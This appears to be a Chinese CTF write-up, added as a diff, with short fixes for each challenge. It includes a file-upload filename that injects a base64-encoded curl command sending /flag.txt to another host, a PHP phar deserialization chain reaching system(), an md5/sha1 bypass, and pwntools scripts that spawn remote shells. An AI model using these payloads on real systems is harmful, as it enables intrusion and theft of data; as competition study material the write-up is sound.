@@ -1,0 +1,345 @@
+web
+pysym
+直接命令拼接
+POST / HTTP/1.1
+Host: 172.1.50.9:1337
+Content-Length: 311
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+Origin: http://172.1.50.9:1337
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWjsOu8TZyy5OYe6D
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://172.1.50.9:1337/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,ja;q=0.8
+Connection: close
+
+------WebKitFormBoundaryWjsOu8TZyy5OYe6D
+Content-Disposition: form-data; name="file"; filename="aa||curl 172.1.50.102:8889?`echo 'Y3VybCAxNzIuMS41MC4xMDI6MTIzNDUvYGNhdCAvZmxhZy50eHRgOyBwd2Q='  |base64  -d |bash`|"
+Content-Type: text/plain
+
+#!/bin/bash
+ls >a.txt
+------WebKitFormBoundaryWjsOu8TZyy5OYe6D--
+
+
+
+filecheck
+
+用php://filter来绕过waf
+php://filter/read=convert.base64-encode/resource=phar://./upload/bde7cf9049e122a728d29f2213bb2b67.jpg
+exp如下
+<?php
+class file
+{
+    public $name;
+    public $data;
+    public $ou;
+    public function __wakeup()
+    {
+        // TODO: Implement __wakeup() method.
+        $this->data='you need do something';
+    }
+    public function __call($name, $arguments)
+    {
+//        phpinfo();
+        return $this->ou->b='78ty7badh2';
+    }
+
+    public function __destruct()
+    {
+        if (@file_get_contents($this->data) == "Hellociscccn") {
+            $this->name->function();
+        }
+
+        $this->name->function();
+
+    }
+}
+
+class data
+{
+    public $a;
+    public $oi;
+
+    public function __set($name, $value)
+    {
+        // TODO: Implement __set() method.
+        $this->yyyou();
+        return "hhh";
+    }
+
+    public function yyyou()
+    {
+        system($this->oi);
+    }
+}
+
+$a=new file();
+$b=new file();
+$c=new data();
+$a->data="data://text/plain,Hellociscccn";
+$a->name=$b;
+$b->ou=$c;
+$c->oi="cat /flag.txt >3.txt";
+//$arr=array("evil"=>$a);
+//
+//$oa=new RecursiveArrayIterator($arr);
+
+
+$phar = new Phar("1.phar"); //后缀名必须为phar
+$phar->startBuffering();
+// <?php __HALT_COMPILER();
+$phar->setStub("GIF89a" . " __HALT_COMPILER(); ?>"); //设置stub
+
+$phar->setMetadata($a); //将自定义的meta-data存入manifest
+$phar->addFromString("test.txt", "test");
+//签名自动计算
+$phar->stopBuffering();
+rename("1.phar", "11.gif");
+
+//serialize($a);
+
+再改属性数量，修改签名就行了
+
+from hashlib import sha1
+f = open('./11.gif', 'rb').read() # 修改内容后的phar文件
+s = f[:-28] # 获取要签名的数据
+h = f[-8:] # 获取签名类型以及GBMB标识
+newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMB
+open('121.gif', 'wb').write(newf) # 写入新文件
+
+这个题的修就是过滤php和://这些就行了，不要给他伪协议触发
+
+easy_date
+
+<?php
+$a = new Error("payload",1);$b = new Error("payload",2); //要在一行
+class date{
+    public $a;
+    public $b;
+    public $file;
+    public function __wakeup()
+    {
+        if(is_array($this->a)||is_array($this->b)){
+            die('no array');
+        }
+        if( ($this->a !== $this->b) && (md5($this->a) === md5($this->b)) && (sha1($this->a)=== sha1($this->b)) ){
+            $content=date($this->file);
+            $uuid=uniqid().'.txt';
+            file_put_contents($uuid,$content);
+            $data=preg_replace('/((\s)*(\n)+(\s)*)/i','',file_get_contents($uuid));
+            echo file_get_contents($data);
+        }
+        else{
+            die();
+        }
+    }
+}
+
+$a = new Error("payload",1);$b = new Error("payload",2); //要在一行
+$adate=new date();
+$adate->a=$a;
+$adate->b=$b;
+$adate->file="/f\l\a\g.\\tx\\t";
+echo base64_encode(serialize($adate));
+//unserialize(serialize($adate));
+
+原生类绕过md5和sha1
+date用\绕过
+
+
+这个题的修就是过滤\就行了
+
+
+pwn
+
+# magic
+
+一个数组溢出，向上溢出改data里面存的函数为6666那个函数，读出来就行
+
+```
+from pwn import *
+from LibcSearcher import * 
+context(arch = 'amd64', os = 'linux', log_level = 'debug')
+local_file  = './magic'
+local_libc  = './libc-2.23.so'
+#remote_libc = './libc-2.27.so'
+#remote_libc = '/home/glibc-all-in-one/libs/buu/libc-2.23.so'
+select = 1
+if select == 0:
+    r = process(local_file)
+#    libc = ELF(local_libc)
+else:
+    r = remote('172.1.50.2',8888)
+#    libc = ELF(remote_libc)
+elf = ELF(local_file)
+#libc = ELF('./glibc-all-in-one-master/libs/2.35-0ubuntu3.1_amd64/libc.so.6')
+#context.arch = elf.arch
+se      = lambda data               :r.send(data)
+sa      = lambda delim,data         :r.sendafter(delim, data)
+sl      = lambda data               :r.sendline(data)
+sla     = lambda delim,data         :r.sendlineafter(delim, data)
+sea     = lambda delim,data         :r.sendafter(delim, data)
+rc      = lambda numb=4096          :r.recv(numb)
+rl      = lambda                    :r.recvline()
+ru      = lambda delims                         :r.recvuntil(delims)
+uu32    = lambda data               :u32(data.ljust(4, '\0'))
+uu64    = lambda data               :u64(data.ljust(8, '\0'))
+info    = lambda tag, addr        :r.info(tag + ': {:#x}'.format(addr))
+#def debug(cmd=''):
+#     gdb.attach(r,cmd)
+#leak = u64(ru(b'\x7f')[-6:].ljust(8,b'\x00'))
+#log.success('leak:'+hex(leak))
+#leak = u64(ru(b'\n')[:-1].ljust(8,b'\x00'))
+#log.success('leak:'+hex(leak))
+#libc = LibcSearcher('free',leak)
+#lb = leak - libc.dump('free')
+#sys = lb + libc.dump('system')
+#sh = lb + libc.dump('str_bin_sh')
+o_g_32_old = [0x3ac3c, 0x3ac3e, 0x3ac42, 0x3ac49, 0x5faa5, 0x5faa6]
+o_g_32 = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79, 0x5fbd5, 0x5fbd6]
+o_g_old = [0x45216,0x4526a,0xf02a4,0xf1147]
+o_g = [0x45226, 0x4527a, 0xf0364, 0xf1207]
+#————————————————
+#leak = int(rc(12),16)
+#log.success('leak:'+hex(leak))
+#lb = leak - 0x20740
+#log.success('lb:'+hex(lb))
+sc_64 = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
+#asm(shellcraft.sh())
+#payload = fmtstr_payload(offset=6, writes{p_got:s_plt},write_size="short",write_size_max="short")
+#################################################
+#leak
+# 0x55400b30
+
+ru('you say')
+pay = b'\x7f'*26*2+b'\x3e'
+sl(pay)
+
+ru('can do')
+
+sl('-12')
+sl('-187')
+
+
+r.interactive()
+```
+
+
+
+# minicode
+
+输入shellcode执行，利用寄存器残留状态
+
+```
+from pwn import *
+from LibcSearcher import * 
+context(arch = 'amd64', os = 'linux', log_level = 'debug')
+local_file  = './pwn1'
+local_libc  = './libc-2.23.so'
+#remote_libc = './libc-2.27.so'
+#remote_libc = '/home/glibc-all-in-one/libs/buu/libc-2.23.so'
+select = 1
+if select == 0:
+    r = process(local_file)
+#    libc = ELF(local_libc)
+else:
+    r = remote('172.1.50.10',8888)
+#    libc = ELF(remote_libc)
+#elf = ELF(local_file)
+#libc = ELF('./glibc-all-in-one-master/libs/2.35-0ubuntu3.1_amd64/libc.so.6')
+#context.arch = elf.arch
+se      = lambda data               :r.send(data)
+sa      = lambda delim,data         :r.sendafter(delim, data)
+sl      = lambda data               :r.sendline(data)
+sla     = lambda delim,data         :r.sendlineafter(delim, data)
+sea     = lambda delim,data         :r.sendafter(delim, data)
+rc      = lambda numb=4096          :r.recv(numb)
+rl      = lambda                    :r.recvline()
+ru      = lambda delims                         :r.recvuntil(delims)
+uu32    = lambda data               :u32(data.ljust(4, '\0'))
+uu64    = lambda data               :u64(data.ljust(8, '\0'))
+info    = lambda tag, addr        :r.info(tag + ': {:#x}'.format(addr))
+#def debug(cmd=''):
+#     gdb.attach(r,cmd)
+#leak = u64(ru(b'\x7f')[-6:].ljust(8,b'\x00'))
+#log.success('leak:'+hex(leak))
+#leak = u64(ru(b'\n')[:-1].ljust(8,b'\x00'))
+#log.success('leak:'+hex(leak))
+#libc = LibcSearcher('free',leak)
+#lb = leak - libc.dump('free')
+#sys = lb + libc.dump('system')
+#sh = lb + libc.dump('str_bin_sh')
+o_g_32_old = [0x3ac3c, 0x3ac3e, 0x3ac42, 0x3ac49, 0x5faa5, 0x5faa6]
+o_g_32 = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79, 0x5fbd5, 0x5fbd6]
+o_g_old = [0x45216,0x4526a,0xf02a4,0xf1147]
+o_g = [0x45226, 0x4527a, 0xf0364, 0xf1207]
+#————————————————
+#leak = int(rc(12),16)
+#log.success('leak:'+hex(leak))
+#lb = leak - 0x20740
+#log.success('lb:'+hex(lb))
+sc_64 = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
+#asm(shellcraft.sh())
+#payload = fmtstr_payload(offset=6, writes{p_got:s_plt},write_size="short",write_size_max="short")
+#################################################
+def choice(choice):
+	r.sendlineafter(">> ",str(choice))
+
+def add(size,idx,mode):
+	choice(1)
+	r.sendlineafter(":",str(size))
+	r.sendlineafter(":",str(idx))
+	r.sendlineafter("[2]",str(mode))
+	
+def edit(idx,content):
+	choice(4)
+	r.sendlineafter(":",str(idx))
+	r.sendafter(":",content)
+
+def show(idx):
+	choice(3)
+	r.sendlineafter("?",str(idx))
+	
+def free(idx):
+	choice(2)
+	r.sendlineafter(":",str(idx))
+
+def gift(idx):
+	choice(666)
+	r.sendlineafter(":",str(idx))
+
+#################################################
+ru('code:')
+
+s2 = '''
+mov rdi,rbp
+xor rsi,rsi
+xor rdx,rdx
+xor rax,rax
+mov al,0x3b
+syscall
+'''
+
+
+se(asm(s2)+b'\x00'*16+b'/bin/sh\x00')
+
+r.interactive()
+```
+
+# car_factory
+
+修改直接把edit engine里面改成先free再赋值
+
+逆向
+#list1=[0x54,0x5e,0x53,0x55,0x49,7,6,0x70,0x71,0x1f,0x77,1,0,0x0b,0x1f,0,7,4,0x74,0x1f,0x0a,1,1,0x70,0x1f,0x77,0x73,0,6,0,0x1f,0,0x0b,7,4,0,0,0x4f]
+#print(len(list1))
+list1=[0x54, 0x5E, 0x53, 0x55, 0x49, 7, 6, 0x70, 0x71, 0x1F, 0x77, 1,0, 0x0B, 0x1F, 0, 7, 4, 0x74, 0x1F, 0x0A,1,1,0x70,0x1F, 0x77, 0x73, 0, 6, 0x1F, 0x0B, 7, 4, 0, 0x4F]
+for val in list1:
+    t1=chr(val^0x32)
+    print(t1,end="")
+#flag{54BC-E329-256F-833B-EA24-9562}
+
+
